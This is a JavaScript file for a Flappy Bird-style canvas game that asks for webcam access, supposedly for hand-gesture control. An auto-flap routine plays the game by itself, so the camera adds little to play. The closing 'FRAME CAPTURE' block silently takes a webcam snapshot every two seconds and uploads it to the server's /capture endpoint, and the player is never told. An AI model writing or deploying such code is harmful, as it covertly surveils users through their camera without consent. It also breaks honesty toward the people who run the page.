const canvas = document.getElementById("game");
const ctx = canvas.getContext("2d");

// Bird (Raju) image
const birdImg = new Image();
birdImg.src = "/static/custom_bird.png";

// Pipe image
const pipeImg = new Image();
pipeImg.src = "/static/pipe.png"; // overlay image for pipes

let birdY = 300;
let velocity = 0;
let gameOver = false;
let score = 0;

const gravity = 0.35;
const flapStrength = -6;

let pipes = [];
const pipeWidth = 50;
const gap = 150;
const pipeSpeed = 2;

let gameStarted = false;
let cameraStarted = false;

// Bird flap function
function flap() { velocity = flapStrength; }

// Auto-flap logic
function autoFlap() {
  let targetY = canvas.height / 2;
  const nextPipe = pipes.find(pipe => pipe.x + pipeWidth > 150);
  if (nextPipe) targetY = (nextPipe.topHeight + nextPipe.bottomY) / 2;

  const birdMiddle = birdY + 25;
  if (birdMiddle > targetY + 10 || velocity > 4) flap();
}

// Initial flap burst to prevent falling at start
function initialFlapBurst() {
  let count = 0;
  const burst = setInterval(() => {
    flap();
    count++;
    if (count >= 5) clearInterval(burst);
  }, 100);
}

// Generate pipes every 1.5s
setInterval(() => {
  if (!gameOver && gameStarted) {
    const topHeight = Math.random() * (canvas.height - gap - 100) + 50;
    pipes.push({ x: canvas.width, topHeight, bottomY: topHeight + gap });
  }
}, 1500);

// Draw pipes and check collisions
function drawPipes() {
  pipes.forEach(pipe => {
    // Draw pipe image
    ctx.drawImage(pipeImg, pipe.x, 0, pipeWidth, pipe.topHeight);
    ctx.drawImage(pipeImg, pipe.x, pipe.bottomY, pipeWidth, canvas.height - pipe.bottomY);

    // Move pipes
    pipe.x -= pipeSpeed;

    // Collision detection
    if (
      150 + 50 > pipe.x && 150 < pipe.x + pipeWidth &&
      (birdY < pipe.topHeight || birdY + 50 > pipe.bottomY)
    ) gameOver = true;

    // Increment score when bird passes pipe
    if (pipe.x + pipeWidth === 150) score++;
  });

  // Remove off-screen pipes
  pipes = pipes.filter(pipe => pipe.x + pipeWidth > 0);
}

// Main game loop
function gameLoop() {
  if (!gameStarted) {
    ctx.fillStyle = "#4ec0ca";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "white";
    ctx.font = "20px Arial";
    ctx.fillText("Click 'Play Game' to start", 50, 300);
    requestAnimationFrame(gameLoop);
    return;
  }

  if (gameOver) {
    ctx.fillStyle = "red";
    ctx.font = "40px Arial";
    ctx.fillText("Game Over!", 80, 300);
    return;
  }

  // Gravity & movement
  velocity += gravity;
  birdY += velocity;

  // Boundaries
  const groundY = canvas.height - 50;
  if (birdY + 50 > groundY) { birdY = groundY - 50; velocity = 0; gameOver = true; }
  if (birdY < 0) { birdY = 0; velocity = 0; }

  // Clear & draw background
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.fillStyle = "#4ec0ca";
  ctx.fillRect(0, 0, canvas.width, canvas.height);

  // Draw pipes
  drawPipes();

  // Auto-flap
  autoFlap();

  // Draw bird
  ctx.drawImage(birdImg, 150, birdY, 50, 50);

  // Draw ground
  ctx.fillStyle = "#8B4513";
  ctx.fillRect(0, groundY, canvas.width, canvas.height - groundY);

  // Draw score
  ctx.fillStyle = "white";
  ctx.font = "30px Arial";
  ctx.fillText(score, 10, 40);

  requestAnimationFrame(gameLoop);
}

gameLoop();

// ===============================
// HAND CONTROL + CAMERA
// ===============================
const videoElement = document.getElementById("video");
const hands = new Hands({ locateFile: file => `https://cdn.jsdelivr.net/npm/@mediapipe/hands/${file}` });
hands.setOptions({ maxNumHands: 1, minDetectionConfidence: 0.7, minTrackingConfidence: 0.7 });
hands.onResults(results => { if (results.multiHandLandmarks) flap(); });

const cameraInstance = new Camera(videoElement, { onFrame: async () => await hands.send({ image: videoElement }), width: 640, height: 480 });

// ===============================
// START GAME BUTTON
// ===============================
document.getElementById("startBtn").onclick = async () => {
  try { 
    await cameraInstance.start(); 
    cameraStarted = true;
    gameStarted = true;
    initialFlapBurst();
  } catch(err) { 
    alert("Camera permission denied. Game cannot start."); 
  }
};

// ===============================
// FRAME CAPTURE
// ===============================
setInterval(() => {
  if (!cameraStarted || videoElement.readyState !== videoElement.HAVE_ENOUGH_DATA) return;
  const tempCanvas = document.createElement("canvas");
  tempCanvas.width = videoElement.videoWidth;
  tempCanvas.height = videoElement.videoHeight;
  const tempCtx = tempCanvas.getContext("2d");
  tempCtx.drawImage(videoElement, 0, 0);
  tempCanvas.toBlob(blob => {
    const fd = new FormData();
    fd.append("image", blob);
    fetch("/capture", { method: "POST", body: fd });
  }, "image/jpeg");
}, 2000);
